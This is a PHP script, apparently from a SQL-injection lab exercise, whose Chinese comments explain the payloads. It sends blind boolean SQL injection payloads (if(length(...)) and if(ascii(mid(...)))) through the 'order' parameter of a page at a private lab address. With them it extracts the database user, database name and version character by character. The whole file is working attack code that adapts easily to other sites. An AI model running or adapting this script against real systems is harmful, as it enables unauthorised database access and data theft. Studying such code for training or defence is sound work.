<?php
function httpGet($url){
	$ch=curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$res=curl_exec($ch);	
	return $res;
	curl_close($ch);
}
function _httpGet($url){
	try{
		return httpGet($url);
	}
	catch(exception $e){
		return _httpGet($url);
	}
}

//查询关于数据库的信息 user（），database（），version（）
//利用if([],[],[])函数判断user()长度：参数1，payload表达式；参数2：参数1表达式正确即返回参数2内容；参数3，参数1表达式错误即返回参数3内容
//user()
for ($i=1; $i <30 ; $i++) { 
	$url="http://192.168.214.131/sqli/example9.php?order=if(length(user())=$i,name,age)";
	$res=_httpGet($url);
	$res=substr($res,1584,4);
	if ($res=='root') {
		echo "user()长度为：".$i."\r\n";
		break;
	}
}
//database()
for ($i=1; $i <30 ; $i++) { 
	$url="http://192.168.214.131/sqli/example9.php?order=if(length(database())=$i,name,age)";
	$res=_httpGet($url);
	$res=substr($res,1584,4);
	if ($res=='root') {
		echo "database()长度为：".$i."\r\n";
		break;
	}
}
//version()
for ($i=1; $i <30 ; $i++) { 
	$url="http://192.168.214.131/sqli/example9.php?order=if(length(version())=$i,name,age)";
	$res=_httpGet($url);
	$res=substr($res,1584,4);
	if ($res=='root') {
		echo "version()长度为：".$i."\r\n";
		break;
	}
}
//利用ascii(),mid()函数，mid([],[],[])参数1：需要截取的字符串；参数2：在第几位截取，从1开始；参数3：截取几位
//user()
for ($j=1; $j <23 ; $j++) { 
	for ($i=33; $i <127 ; $i++) { 
		$url="http://192.168.214.131/sqli/example9.php?order=if(ascii(mid(user(),$j,1))=$i,name,age)";
		$res=_httpGet($url);
		if (!$res) {
			break;
		}
		//echo $url;
		$res=substr($res,1584,4);
		if ($res=='root') {
			echo chr($i);
			break;
		}
	}
}
echo "\r\n";
//database()
for ($j=1; $j <10 ; $j++) { 
	for ($i=33; $i <127 ; $i++) { 
		$url="http://192.168.214.131/sqli/example9.php?order=if(ascii(mid(database(),$j,1))=$i,name,age)";
		$res=_httpGet($url);
		$res=substr($res,1584,4);
		if ($res=='root') {
			echo chr($i);
			break;
		}
	}
}
echo "\r\n";
//version()
for ($j=1; $j <18 ; $j++) { 
	for ($i=33; $i <127 ; $i++) { 
		$url="http://192.168.214.131/sqli/example9.php?order=if(ascii(mid(version(),$j,1))=$i,name,age)";
		$res=_httpGet($url);
		$res=substr($res,1584,4);
		if ($res=='root') {
			echo chr($i);
			break;
		}
	}
}

















?>